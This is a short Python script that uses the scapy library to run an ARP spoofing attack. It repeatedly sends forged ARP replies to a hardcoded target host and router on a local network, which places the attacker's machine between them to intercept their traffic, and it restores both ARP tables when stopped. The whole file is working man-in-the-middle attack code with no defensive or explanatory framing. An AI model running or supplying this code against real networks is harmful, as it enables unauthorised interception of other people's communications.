#!/usr/bin/env python

import scapy.all as scapy
import time

ATTACKED_HOST_IP = '192.168.1.79'
# ATTACKED_HOST_MAC = '80:80:80:80:80:80'
ROUTER_IP = '192.168.1.254'


def get_mac_addr(ip):
    ''' Get mac address by ip '''
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_req_broadcast = broadcast / arp_req
    resp_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return resp_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac_addr = get_mac_addr(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_addr,
        psrc=spoof_ip)
    scapy.send(packet)

def change_table_back(target_ip, server_ip):
    target_mac_addr = get_mac_addr(target_ip)
    server_mac_addr = get_mac_addr(server_ip)
    packet = scapy.ARP(op=2,
                       pdst=target_ip, hwdst=target_mac_addr,
                       psrc=server_ip, hwsrc=server_mac_addr)
    scapy.send(packet)
try:
    while True:
        spoof(ATTACKED_HOST_IP, ROUTER_IP)
        spoof(ROUTER_IP, ATTACKED_HOST_IP)
        print("Spoofing now")
        time.sleep(2)
except:
    change_table_back(ATTACKED_HOST_IP, ROUTER_IP)
    change_table_back(ROUTER_IP, ATTACKED_HOST_IP)
    print('\nStopped')


